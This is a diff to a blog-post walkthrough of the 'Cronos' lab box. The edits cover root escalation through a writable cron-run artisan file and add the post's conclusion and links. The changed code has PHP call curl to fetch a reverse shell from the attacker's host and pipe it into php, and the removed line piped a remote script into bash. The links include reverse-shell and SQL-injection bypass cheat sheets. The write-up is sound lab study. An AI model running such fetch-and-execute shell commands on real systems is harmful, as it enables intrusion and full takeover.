@@ -113,27 +113,32 @@ We own the file, and are able to write to it.
 
 Editing artisan:
 
+![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/cron.png)
 
 ~~~
 <?php
-system('curl http://10.10.10.14/script.sh | bash')
+system('curl http://10.10.10.14/rev.php | php')
 ?>
 
-This will download the php reverse shell 
+This will download the php reverse shell from my host, and pipe it into php to execute.
 
+php reverse shell: http://pentestmonkey.net/tools/web-shells/php-reverse-shell
+~~~
 
+Waiting a couple of seconds, and looking at our listener:
 
+![Screenshot]({{ site.baseurl }}/images/posts/2017/cronos/root.png)
 
+## iv. Conclusion
 
+I really like how this box uses DNS and Virtual Hosting. Not too many boxes use DNS, so this was a great refresher/practice. 
 
-
-
-
-
+Thanks for reading.
 
 ~~~
 Sources / Links:
-[0]: https://serverfault.com/questions/217654/difference-between-nt-authority-network-service-and-nt-authority-system
+[0]: https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
+[1]: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 ~~~
 
 
